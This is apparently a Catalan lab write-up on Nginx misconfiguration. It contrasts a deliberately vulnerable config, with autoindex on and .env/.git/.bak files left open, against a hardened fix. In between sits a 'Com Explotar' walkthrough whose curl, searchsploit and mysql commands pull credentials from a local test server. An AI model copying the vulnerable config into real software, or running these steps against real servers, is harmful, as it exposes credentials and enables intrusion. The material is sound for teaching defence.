# Servei 2: Nginx - Misconfiguracio i Exposicio d'Informacio

## Descripció Breu

Una configuracio incorrecta de Nginx pot exposar informacio sensible del servidor i del sistema de fitxers. Les dues misconfiguracions mes habituals son el directory listing activat, que permet veure tots els fitxers d'un directori, i server_tokens activat, que revela la versio exacta de Nginx. Combinats, permeten a un atacant identificar vulnerabilitats especifiques i accedir a fitxers sensibles com fitxers .env, backups o configuracions.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Exposicio de fitxers sensibles (.env, .conf, backups)
- **Integritat** -> La informacio de versio facilita atacs dirigits
- **Disponibilitat** -> Pot permetre el descobriment de vectors d'atac addicionals

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Alt |
| **CVE relacionat** | CWE-548 (Information Exposure Through Directory Listing) |
| **Impacte real** | Lectura de credencials, configuracions i dades sensibles |
| **Escenari tipic** | Fitxer .env amb credencials de base de dades accessible publicament |

---

## Implementació Vulnerable

```nginx
server {
    listen 80;
    root /var/www/html;

    # Exposar versio del servidor
    server_tokens on;

    # Directory listing activat
    location / {
        autoindex on;
        autoindex_exact_size on;
    }

    # Fitxers de configuracio accessibles
    location ~ /\.(conf|env|git|sql|bak) {
        allow all;
    }
}
```

### Verificació de la vulnerabilitat

```bash
# Comprovar que el directory listing esta actiu
curl http://localhost:9003/
# Output: llista HTML de tots els fitxers del directori

# Comprovar que la versio s'exposa
curl -v http://localhost:9003/ 2>&1 | grep "Server:"
# Output: Server: nginx/1.18.0

# Accedir al fitxer .env amb credencials
curl http://localhost:9003/.env
# Output: DB_PASSWORD=secret123
```

---

## Com Explotar

### Pas 1: Descobrir la versio i buscar CVEs
```bash
curl -v http://localhost:9003/ 2>&1 | grep "Server:"
# Server: nginx/1.18.0

# Buscar vulnerabilitats per aquesta versio
searchsploit nginx 1.18
# O consultar https://nvd.nist.gov/vuln/search
```

### Pas 2: Enumerar fitxers via directory listing
```bash
# Veure tots els fitxers del servidor
curl http://localhost:9003/
# Surten tots els fitxers inclosos .env, config.conf, etc.
```

### Pas 3: Extreure fitxers sensibles
```bash
# Descarregar fitxer de credencials
curl http://localhost:9003/.env
# Output: DB_PASSWORD=secret123

curl http://localhost:9003/config.conf
# Output: contingut de configuracio sensible
```

### Pas 4: Usar les credencials obtingudes
```bash
# Amb les credencials del .env, connectar a la base de dades
mysql -h <host> -u root -psecret123
```

---

## Solució

```nginx
server {
    listen 80;
    root /var/www/html;

    # Amagar versio del servidor
    server_tokens off;

    location / {
        # Directory listing desactivat
        autoindex off;
        try_files $uri $uri/ =404;
    }

    # Bloquejar acces a fitxers sensibles
    location ~ /\.(conf|env|git|sql|bak|htaccess) {
        deny all;
        return 404;
    }
}
```

### Verificació de la correcció
```bash
# Directory listing desactivat
curl http://localhost:9004/
# Output: 403 Forbidden

# Versio no exposada
curl -v http://localhost:9004/ 2>&1 | grep "Server:"
# Output: Server: nginx

# Fitxer .env no accessible
curl http://localhost:9004/.env
# Output: 404 Not Found
```

---

## Bones Practiques

- Sempre configurar server_tokens off a produccio
- Mai activar autoindex en entorns publics
- Bloquejar acces a fitxers ocults (.env, .git, .htaccess)
- No emmagatzemar fitxers de configuracio al directori public del servidor
- Revisar la configuracio amb eines com Nikto o Mozilla Observatory

---

## Referencies

- [Nginx Security Controls](https://nginx.org/en/docs/http/ngx_http_core_module.html)
- [CWE-548: Directory Listing](https://cwe.mitre.org/data/definitions/548.html)
- [Mozilla Observatory](https://observatory.mozilla.org/)
- [Nikto Web Scanner](https://github.com/sullo/nikto)
